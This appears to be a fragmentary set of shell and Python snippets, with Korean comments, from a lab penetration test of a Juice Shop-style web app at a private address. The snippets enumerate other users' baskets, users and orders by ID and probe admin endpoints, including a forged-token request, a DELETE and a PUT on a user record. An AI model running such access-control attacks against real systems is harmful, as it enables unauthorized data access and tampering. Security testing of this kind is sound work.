...
curl -s http://10.20.40.81:3000/rest/basket/1 \
...
for basket_id in 1 2 3 4 5; do
  read code size < <(curl -s -o /tmp/basket.json -w "%{http_code} %{size_download}" \
    "http://10.20.40.81:3000/rest/basket/$basket_id" -H "Authorization: Bearer $TOKEN1")
...
for user_id in 1 2 3 4 5; do
  result=$(curl -s -w "::%{http_code}" "http://10.20.40.81:3000/api/Users/$user_id" -H "Authorization: Bearer $TOKEN1")
...
for order_id in 1 2 3 4 5; do                          # 반복문 시작
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    http://10.20.40.81:3000/rest/track-order/$order_id \
...
token = None
# 로그인
r = requests.post("http://10.20.40.81:3000/rest/user/login",
...
for ep in endpoints:                                   # 반복문 시작
    ...
    for test_id in [1, 2, 99]:                         # 반복문 시작
        url = f"http://10.20.40.81:3000{ep.replace('{id}', str(test_id))}"
        try:
...
test_admin GET    http://10.20.40.81:3000/administration              "관리자 페이지"
test_admin GET    http://10.20.40.81:3000/api/Users/                  "사용자 목록"
test_admin DELETE http://10.20.40.81:3000/api/Feedbacks/1             "피드백 삭제"
test_admin GET    http://10.20.40.81:3000/api/Recycles/               "재활용 관리"
```
...
# 조작된 토큰으로 관리자 API 접근
r = requests.get("http://10.20.40.81:3000/api/Users/",
...
curl -s -X PUT http://10.20.40.81:3000/api/Users/1 \
  -H "Content-Type: application/json" \
...
TARGET="http://10.20.40.81:3000/api/Users/"
printf "%-10s %-8s %s\n" "method" "code" "verdict"
...
for path in "${PATHS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.40.81:3000$path" -H "Authorization: Bearer $TOKEN1")
  printf "%-30s %-8s\n" "$path" "$code"
done
```
